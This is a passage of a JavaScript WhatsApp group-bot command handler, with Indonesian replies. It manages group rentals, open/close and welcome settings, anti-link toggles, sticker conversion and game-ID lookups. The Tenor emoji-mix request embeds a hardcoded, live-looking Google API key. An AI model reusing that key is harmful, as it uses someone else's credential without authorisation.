              if (!isSewa) return replyDeface(`Bot tidak disewa di Grup ini`)
              sewa.splice(_sewa.getSewaPosition(from, sewa), 1)
              fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa))
              replyDeface(`Sukses`)
              break
        case 'delsw':
            if (!isOwner) return replyDeface(mess.OnlyOwner)
            if (!isGroup) return replyDeface(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
            if (!isSewa) return replyDeface(`Bot tidak disewa di Grup ini`)
            sewa.splice(_sewa.getSewaPosition(args[0], sewa), 1)
            fs.writeFileSync('./database/sewa.json', JSON.stringify(sewa, null, 2))
            replyDeface(`Sukses`)
            break

case 'checksewa': case 'ceksewa':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isSewa) return replyDeface(`Bot tidak di sewa group ini!`)
            let ceksewa = ms(_sewa.getSewaExpired(from, sewa) - Date.now())
            let sewanya = `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s)`
            replyDeface(sewanya)
            break

case 'listsewa':
if (!isOwner) return replyDeface(mess.OnlyOwner)
            let list_sewa_list = `*LIST-SEWA-GROUP*\n\n*Total:* ${sewa.length}\n\n`
            let data_array = [];
            for (let x of sewa) {
                ////addCountCmd(`${prefix}listsewa`, sender, _cmd)
                list_sewa_list += `*Name:* ${await getGcName(x.id)}\n*ID :* ${x.id}\n`
                if (x.expired === 'PERMANENT') {
                    let ceksewa = 'PERMANENT'
                    list_sewa_list += `*Expire :* PERMANENT\n\n`
                } else {
                    let ceksewa = ms(x.expired - Date.now())
                    list_sewa_list += `*Expire :* ${ceksewa.days} day(s) ${ceksewa.hours} hour(s) ${ceksewa.minutes} minute(s) ${ceksewa.seconds} second(s)\n\n`
                }
            }
            setya.sendMessage(from, { text: list_sewa_list }, { quoted: msg })
            break

case 'setppgrup': case 'setppgc':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (isImage || isQuotedImage) {
            //addCountCmd(`${prefix}setppgrup`, sender, _cmd)
            var media = await downloadAndSaveMediaMessage('image', `ppgc${from}.jpeg`)
            if (args[0] == '\'panjang\'') {
            	var { img } = await generateProfilePicture(media)
            	await setya.query({
                    tag: 'iq',
                    attrs: {
                        to: from,
                        type:'set',
                        xmlns: 'w:profile:picture'
                    },
                    content: [
                    {
                        tag: 'picture',
                        attrs: { type: 'image' },
                        content: img
                    } 
                    ]
                })
                fs.unlinkSync(media)
            	replyDeface(`Sukses`)
            } else {
                await setya.updateProfilePicture(from, { url: media })
                .then( res => {
                    replyDeface(`Sukses`)
                    fs.unlinkSync(media)
                }).catch(() => replyDeface(mess.error.api))
            }
            } else {
			    replyDeface(`Kirim/balas gambar dengan caption ${command}`)
            }
            break
        case 'setnamegrup': case 'setnamegc': case 'setname':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (args.length < 0) return replyDeface(`Gunakan dengan cara ${command} *text*\n\n_Contoh_\n\n${command} Support ${ownerName}`)
            //addCountCmd(`${prefix}setnamegc`, sender, _cmd)
            await setya.groupUpdateSubject(from, q)
            .then( res => {
                replyDeface(`Sukses`)
            }).catch(() => replyDeface(mess.error.api))
            break
        case 'setdesc': case 'setdescription':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (args.length < 0) return replyDeface(`Gunakan dengan cara ${command} *text*\n\n_Contoh_\n\n${command} New Description by ${ownerName}`)
            //addCountCmd(`${prefix}setdesc`, sender, _cmd)
            await setya.groupUpdateDescription(from, q)
            .then( res => {
                replyDeface(`Sukses`)
            }).catch(() => replyDeface(mess.error.api))
            break

case 'revoke':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            await setya.groupRevokeInvite(from)
            .then( res => {
                replyDeface(`Sukses menyetel tautan undangan grup ini`)
            }).catch(() => replyDeface(mess.error.api))
            break
        case 'hidetag':
        case 'h':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
			if (!q) return reply(`Masukkan textnya`)
            let mem = [];
            groupMembers.map( i => mem.push(i.id) )
            setya.sendMessage(from, { text: q ? q : m.quotedMsg.chats, mentions: mem })
            break
        case 'delete': case 'del': case 'd':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!m.isQuotedMsg) return replyDeface(`Balas chat dari bot yang ingin dihapus`)
            if (!m.quotedMsg.fromMe) return replyDeface(`Hanya bisa menghapus chat dari bot`)
            setya.sendMessage(from, { delete: { fromMe: true, id: m.quotedMsg.id, remoteJid: from }})
            break
        

case 'welcome':
                    if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
					if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
					if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan*`)
					if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}welcome 1\n\nUntuk Nonaktifkan Welcome Ketik 0\nContoh : ${prefix}welcome 0`)
					if (Number(args[0]) === 1) {
					if (isWelcome) return reply('welcome sudah aktif')
					welcome.push(from)
					fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
					reply('Done Mengaktifkan welcome✅')
					setya.sendMessage(from, { text: `*Welcome Online*` })
					} else if (Number(args[0]) === 0) {
					if (!isWelcome) return reply('Mode welcome sudah disable')
					let anu1 = welcome.indexOf(from)
					welcome.splice(anu1, 1)
					fs.writeFileSync('./database/welcome.json', JSON.stringify(welcome))
					reply('Sukes menonaktifkan welcome di group ini ✔️')
					} else {
					reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
        case 'leave':
        case 'left':
                    if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
					if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
					if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan*`)
					if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}leave 1\n\nUntuk Nonaktifkan Leave Ketik 0\nContoh : ${prefix}leave 0`)
					if (Number(args[0]) === 1) {
					if (isLeft) return reply('left sudah aktif')
					left.push(from)
					fs.writeFileSync('./database/left.json', JSON.stringify(left))
					reply('Done Mengaktifkan left✅')
					setya.sendMessage(from, { text: `*Left Online*` })
					} else if (Number(args[0]) === 0) {
					if (!isLeft) return reply('Mode left sudah disable')
					let anu1 = left.indexOf(from)
					left.splice(anu1, 1)
					fs.writeFileSync('./database/left.json', JSON.stringify(left))
					reply('Sukes menonaktifkan left di group ini ✔️')
					} else {
					reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break

        case 'price':
                    if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
					if (!isOwner) return reply(`Command ${command} Hanya Khusus Admin`)
					if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}price 0\n\nUntuk Nonaktifkan Pricelist Ketik 1\nContoh : ${prefix}pricelist 1`)
					if (Number(args[0]) === 0) {
					if (isPricelist) return reply('Pricelist sudah aktif')
					pricelist.push(from)
					fs.writeFileSync('./database/pricelist.json', JSON.stringify(pricelist))
					reply('Done Mengaktifkan Pricelist Group✅')
					setya.sendMessage(from, { text: `Done Mengaktifkan Pricelist Group` })
					} else if (Number(args[0]) === 1) {
					if (!isPricelist) return reply('Pricelist sudah disable')
					let anu1 = pricelist.indexOf(from)
					pricelist.splice(anu1, 1)
					fs.writeFileSync('./database/pricelist.json', JSON.stringify(pricelist))
					reply('Sukes menonaktifkan Pricelist group di group ini ✔️')
					} else {
					reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break

              case 'antilink':
                    if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
					if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
					if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan Fitur Antilink*`)
					if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}antilink 1\n\nUntuk Nonaktifkan Antilink Ketik 0\nContoh : ${prefix}antilink 0`)
					if (Number(args[0]) === 1) {
					if (isAntiLink) return reply('anti link group sudah aktif')
					antilink.push(from)
					fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
					reply('Done Mengaktifkan Antilink Group✅')
					setya.sendMessage(from, { text: `Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group` })
					} else if (Number(args[0]) === 0) {
					if (!isAntiLink) return reply('Mode anti link group sudah disable')
					let anu1 = antilink.indexOf(from)
					antilink.splice(anu1, 1)
					fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink))
					reply('Sukes menonaktifkan anti link group di group ini ✔️')
					} else {
					reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
				
case 'antilinkwame':
                    if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
					if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
					if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan Fitur Antilink*`)
					if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}antiwame 1\n\nUntuk Nonaktifkan Antiwame Ketik 0\nContoh : ${prefix}antiwame 0`)
					if (Number(args[0]) === 1) {
					if (isAntiWame) return reply('antiwame group sudah aktif')
					antiwame.push(from)
					fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
					reply('Done Mengaktifkan antiwame Group✅')
					setya.sendMessage(from, { text: `Perhatian kepada seluruh member antiwame aktif apabila anda mengirim link antiwame anda akan di kick dari group` })
					} else if (Number(args[0]) === 0) {
					if (!isAntiWame) return reply('Mode antiwame group sudah disable')
					let anu1 = antiwame.indexOf(from)
					antiwame.splice(anu1, 1)
					fs.writeFileSync('./database/antiwame.json', JSON.stringify(antiwame))
					reply('Sukes menonaktifkan antiwame group di group ini ✔️')
					} else {
					reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
					break
case 'antilinkall':
if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan Fitur Antilink*`)
if (args.length < 1) return reply(`Untuk Mengaktifkan Ketik 1\nContoh : ${prefix}antilink 1\n\nUntuk Nonaktifkan Antilink Ketik 0\nContoh : ${prefix}antilink 0`)
if (Number(args[0]) === 1) {
if (isAntiLinkAll) return reply('anti link all group sudah aktif')
antilinkall.push(from)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Done Mengaktifkan Antilink all Group✅')
setya.sendMessage(from, { text: `Perhatian kepada seluruh member anti link group aktif apabila anda mengirim link group anda akan di kick dari group` })
} else if (Number(args[0]) === 0) {
if (!isAntiLinkAll) return reply('Mode anti link all group sudah disable')
let anu1 = antilinkall.indexOf(from)
antilinkall.splice(anu1, 1)
fs.writeFileSync('./database/antilinkall.json', JSON.stringify(antilinkall))
reply('Sukes menonaktifkan anti link all group di group ini ✔️')
} else {
reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
}
break
        case 'open': case 'buka':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            setya.groupSettingUpdate(from, 'not_announcement')
            .then((res) => {
            let opengc = `O━• *Group Open* •━O

📜 *Group Telah Di Buka Oleh Admin* @${sender.split("@")[0]}

${gaya}🎊 Group Open
📆 ${tanggal}
⏰ ${jam}${gaya}

━O━O━••••••••••••━O━O━`
            const tettOpen = getTextSetOpen(from, set_open);
            if (tettOpen !== undefined) {
            mentions(tettOpen.replace('admin', sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [sender], true);
            } else {
            mentions(opengc, [sender], true)
            }
            })
			break

        case 'close': case 'tutup':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
		    if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
		    if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
		    setya.groupSettingUpdate(from, 'announcement')
		    .then((res) => {
			let closegc = `O━• *Group Close* •━O

📜 *Group Telah Di Tutup Oleh Admin* @${sender.split("@")[0]}

${gaya}🎊 Group Tutup
📆 ${tanggal}
⏰ ${jam}${gaya}

━O━O━••••••••••••━O━O━`
            const textClose = getTextSetClose(from, set_close);
            if (textClose !== undefined) {
            mentions(textClose.replace('admin', sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [sender], true);
            } else {
            mentions(closegc, [sender], true)
            }
            })
            .catch((err) => replyDeface('Error'))
		    break

        case 'setopen':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_open*\n\n_Contoh_\n\n${command} Group telah di buka`)
            if (isSetOpen(from, set_open)) return replyDeface(`Set Open already active`)
            addSetOpen(q, from, set_open)
            replyDeface(`Successfully set Open!`)
            break
        case 'updateopen':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_open*\n\n_Contoh_\n\n${command} Group telah di buka`)
            if (isSetOpen(from, set_open)) {
                changeSetOpen(q, from, set_open)
                replyDeface(`Sukses change set Open teks!`)
            } else {
                addSetOpen(q, from, set_open)
                replyDeface(`Sukses change set Open teks!`)
            }
            break
        case 'delsetopen':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetOpen(from, set_open)) return replyDeface(`Belum ada set Open di sini..`)
            removeSetOpen(from, set_open)
            replyDeface(`Sukses delete set Open`)
            break
        case 'setclose':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_close*\n\n_Contoh_\n\n${command} Group telah di tutup`)
            if (isSetClose(from, set_close)) return replyDeface(`Set Close already active`)
            addSetClose(q, from, set_close)
            replyDeface(`Successfully set Close!`)
            break
        case 'updateclose':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_close*\n\n_Contoh_\n\n${command} Group telah di tutup`)
            if (isSetClose(from, set_close)) {
                changeSetClose(q, from, set_close)
                replyDeface(`Sukses change set Close teks!`)
            } else {
                addSetClose(q, from, set_close)
                replyDeface(`Sukses change set Close teks!`)
            }
            break
        case 'delsetclose':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetClose(from, set_close)) return replyDeface(`Belum ada set Close di sini..`)
            removeSetClose(from, set_close)
            replyDeface(`Sukses delete set Close`)
            break

        case 'setwelcome':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @nama, Selamat datang di @grup`)
            if (isSetWelcome(from, set_welcome_db)) return replyDeface(`Sudah Ada Setwelcone Sebelumnya`)
            addSetWelcome(q, from, set_welcome_db)
            //addCountCmd(`${prefix}setwelcome`, sender, _cmd)
            replyDeface(`Sukses Setwelcome!`)
            break
        case 'updatewelcome':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_welcome*\n\n_Contoh_\n\n${command} Halo @nama, Selamat datang di @grup`)
            if (isSetWelcome(from, set_welcome_db)) {
                //addCountCmd(`${prefix}changewelcome`, sender, _cmd)
                changeSetWelcome(q, from, set_welcome_db)
                replyDeface(`Sukses change set welcome teks!`)
            } else {
                //addCountCmd(`${prefix}changewelcome`, sender, _cmd)
                addSetWelcome(q, from, set_welcome_db)
                replyDeface(`Sukses Update Setwelcome`)
            }
            break
        case 'delwelcome':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetWelcome(from, set_welcome_db)) return replyDeface(`Belum Ada Setwelcone Sebelumnya`)
            removeSetWelcome(from, set_welcome_db)
            //addCountCmd(`${prefix}delsetwelcome`, sender, _cmd)
            replyDeface(`Sukses Delete Setwelcome`)
            break
        case 'setleave':
        case 'setleft':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Halo @nama, Selamat tinggal dari @grup`)
            if (isSetLeft(from, set_left_db)) return replyDeface(`Sudah Ada Setleave Sebelumnya`)
            //addCountCmd(`${prefix}setleft`, sender, _cmd)
            addSetLeft(q, from, set_left_db)
            replyDeface(`Sukses Setleave`)
            break
        case 'updateleave':
        case 'updateleft':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} *teks_left*\n\n_Contoh_\n\n${command} Halo @nama, Selamat tinggal dari @grup`)
            if (isSetLeft(from, set_left_db)) {
                //addCountCmd(`${prefix}updateleft`, sender, _cmd)
                changeSetLeft(q, from, set_left_db)
                replyDeface(`Sukses Update Setleave`)
            } else {
                //addCountCmd(`${prefix}updateleft`, sender, _cmd)
                addSetLeft(q, from, set_left_db)
                replyDeface(`Sukses Update Setleave`)
            }
            break
        case 'delsetleft':
        case 'delleave':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetLeft(from, set_left_db)) return replyDeface(`Belum Ada SetLeave Sebelumnya`)
            //addCountCmd(`${prefix}delsetleft`, sender, _cmd)
            removeSetLeft(from, set_left_db)
            replyDeface(`Sukses Delete Setleave`)
            break
        case 'linkgrup': case 'link': case 'linkgc':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            var url = await setya.groupInviteCode(from).catch(() => replyDeface(mess.error.api))
            url = 'https://chat.whatsapp.com/'+url
            replyDeface(url)
            break

case 'pesansementara': 
                if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
		        if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
				if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan Fitur ${prefix + command}*`)
				if (!q) return reply(`Untuk Mengaktifkan\n${prefix}pesansementara on\n\nUntuk Mematikan\n${prefix}pesansementara off`)
                if (args[0] === 'on') {
                setya.sendMessage(from, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'off') {
                setya.sendMessage(from, { disappearingMessagesInChat: false }).then((res) => reply(jsonformat(res))).catch((err) => reply(jsonformat(err)))
                }
              break

case 'editinfo': 
                if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
		        if (!isOwner && !isGroupAdmins) return reply(`Command ${command} Hanya Khusus Admin`)
				if (!isBotGroupAdmins) return reply(`*Jadi Kan Bot Admin Sebelum Menggunakan Fitur ${prefix + command}*`)
				if (!q) return reply(`Untuk Mengaktifkan\n${prefix}editinfo on\n\nUntuk Mematikan\n${prefix}editinfo off`)
                if (args[0] === 'on') {
                setya.groupSettingUpdate(from, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => reply(jsonformat(err)))
                } else if (args[0] === 'off') {
                setya.groupSettingUpdate(from, 'unlocked').then((res) => reply(`Sukses Membuka Edit Info Group`)).catch((err) => reply(jsonformat(err)))
                }
              break

case 'toimg': case 'toimage': case 'tovid': case 'tovideo':
if (!isGroup) return replyDeface(mess.OnlyGrup)
            //if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return replyDeface(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!isQuotedSticker) return replyDeface(`Reply stikernya!`)
            var stream = await downloadContentFromMessage(msg.message.extendedTextMessage?.contextInfo.quotedMessage.stickerMessage, 'sticker')
            var buffer = Buffer.from([])
            for await(const chunk of stream) {
                buffer = Buffer.concat([buffer, chunk])
            }
            var rand1 = 'temp/'+getRandom('.webp')
            var rand2 = 'temp/'+getRandom('.png')
            fs.writeFileSync(`./${rand1}`, buffer)
            if (isQuotedSticker && msg.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated !== true) {
                //addCountCmd(`${prefix}toimg`, sender, _cmd)
                exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
                    fs.unlinkSync(`./${rand1}`)
                    if (err) return replyDeface(mess.error.api)
                    setya.sendMessage(from, { image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                    //limitAdd(sender, limit)
                    fs.unlinkSync(`./${rand2}`)
                })
            } else {
                replyDeface(mess.wait)
                //addCountCmd(`${prefix}tovid`, sender, _cmd)
                webp2mp4File(`./${rand1}`).then(async(data) => {
                    fs.unlinkSync(`./${rand1}`)
                    setya.sendMessage(from, { video: await getBuffer(data.data) }, { quoted: msg })
                    //limitAdd(sender, limit)
                })
            }
            break
        case 'tomp3': case 'toaudio':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            //if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return replyDeface(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (isVideo || isQuotedVideo) {
                let media = await downloadAndSaveMediaMessage('video', `./temp/${sender}.mp4`)
                replyDeface(mess.wait)
                //addCountCmd(`${prefix}tomp3`, sender, _cmd)
                let ran = './temp/'+getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${ran}`, async (err) => {
                    if (err) return replyDeface('Gagal :V')
                    setya.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3` }, { quoted: msg })
                    //limitAdd(sender, limit)
                    fs.unlinkSync(ran)
                })
            } else {
                replyDeface(`Kirim/reply video dengan caption ${command}`)
            }
            break
        case 'ttp':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            //if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return replyDeface(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} text\n\nContoh : ${command} frbot`)
            if (q.length > 75) return replyDeface(`Teksnya terlalu panjang`)
            //addCountCmd(`${prefix}attp`, sender, _cmd)
            //var data = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
            var data = await getBuffer(`https://api.lolhuman.xyz/api/ttp?apikey=${apikey}&text=${encodeURIComponent(q)}`)
            var rand2 = 'temp/'+getRandom('.webp')
            fs.writeFileSync(`./${rand2}`, data)
            exec(`webpmux -set exif ./temp/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                setya.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                //limitAdd(sender, limit)
                fs.unlinkSync(`./${rand2}`)
            })
            break
        case 'attp':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            //if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return replyDeface(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (!q) return replyDeface(`Gunakan dengan cara ${command} text\n\nContoh : ${command} frbot`)
            if (q.length > 75) return replyDeface(`Teksnya terlalu panjang`)
            //addCountCmd(`${prefix}attp`, sender, _cmd)
            //var data = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(q)}`)
            var data = await getBuffer(`https://api.lolhuman.xyz/api/attp?apikey=${apikey}&text=${encodeURIComponent(q)}`)
            var rand2 = 'temp/'+getRandom('.webp')
            fs.writeFileSync(`./${rand2}`, data)
            exec(`webpmux -set exif ./temp/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
                setya.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
                //limitAdd(sender, limit)
                fs.unlinkSync(`./${rand2}`)
            })
            break
        case 'emojimix': case 'mixemoji':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            //if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return replyDeface(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
            if (args.length < 0) return replyDeface(`Gunakan dengan cara ${command} emoji1+emoji2\n\nContoh : ${command} 😅+😝`)
            var packname = `${ownerName}`
            var author = `${botName}`
            var emo1 = q.split("+")[0]
            var emo2 = q.split("+")[1]
            if (!isEmoji(emo1) || !isEmoji(emo2)) return replyDeface(`Itu bukan emoji!`)
            //addCountCmd(`${prefix}emojimix`, sender, _cmd)
            fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
            .then(data => {
                sendStickerFromUrl(from, data.results[0]. url, packname, author, { quoted: msg })
                //limitAdd(sender, limit)
            }).catch((e) => replyDeface(mess.error.api))
            break

case 'sticker':
        case 's':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isImage && !isQuotedImage && !isVideo && !isQuotedVideo) return reply(`Kirim media dengan caption ${prefix + command} atau tag media yang sudah dikirim`)
            var stream = await downloadContentFromMessage(msg.message[mediaType], mediaType.replace('Message', ''))
            var randsvid = 'temp/'+getRandom('.webp')
            let stickerStream = new PassThrough()
            if (isImage || isQuotedImage) {
                ffmpeg(stream)
                    .on('start', function (cmd) {
                        console.log(`Started : ${cmd}`)
                    })
                    .on('error', function (err) {
                        console.log(`Error : ${err}`)
                    })
                    .on('end', function () {
                        console.log('Finish')
                    })
                    .addOutputOptions([
                        `-vcodec`,
                        `libwebp`,
                        `-vf`,
                        `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
                    ])
                    .toFormat('webp')
                    .writeToStream(stickerStream)
                sock.sendMessage(from, { sticker: { stream: stickerStream } })
            } else if (isVideo || isQuotedVideo) {
                ffmpeg(stream)
                    .on('start', function (cmd) {
                        console.log(`Started : ${cmd}`)
                    })
                    .on('error', function (err) {
                        console.log(`Error : ${err}`)
                    })
                    .on('end', async () => {
                        sock.sendMessage(from, { sticker: fs.readFileSync(`./${randsvid}`) }).then(() => {
                            fs.unlinkSync(`./${randsvid}`)
                            console.log('Finish')
                        })
                    })
                    .addOutputOptions([
                        `-vcodec`,
                        `libwebp`,
                        `-vf`,
                        `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`,
                    ])
                    .toFormat('webp')
                    .save(`./${randsvid}`)
            }
            break

case 'join':
            if (!isOwner) return replyDeface(mess.OnlyOwner)
            if (args.length < 0) return replyDeface(`Kirim perintah ${command} _linkgrup_`)
            if (!isUrl(args[0])) return replyDeface(mess.error.Iv)
            var url = args[0]
            var url = url.split('https://chat.whatsapp.com/')[1]
            var data = await setya.groupAcceptInvite(url)
            reply(jsonformat(data))
            break

// Search Menu
case 'ffid':
if (!isGroup) return replyDeface(mess.OnlyGrup)
if (!args[0]) return reply(`Example : \n${prefix + command} 946716486`)
if (!Number(args[0])) return reply("Hanya angka")
let dede = await xzons.nickff(args.join(" "))
teks = `*🔎 FREE FIRE 🔍*\n\nID : ${q}\nNICK :  ${dede.username}`
reply(teks)
break

case 'mlid':
if (!isGroup) return replyDeface(mess.OnlyGrup)
var args1 = q.split("/")[0]
var args2 = q.split("/")[1]                
if (!q) return reply(`Example : \n${prefix + command} 617243212/8460`)
if (!Number(args1) && !Number(args2)) return reply("Hanya angka")
let deede = await xzons.nickml(args1, args2)
var teks = `*🔎 MOBILE LEGENDS 🔍*

ID : ${q}
Nick : ${deede.userName}`
reply(teks)
break

        case 'pubgid':
        if (!isGroup) return replyDeface(mess.OnlyGrup)
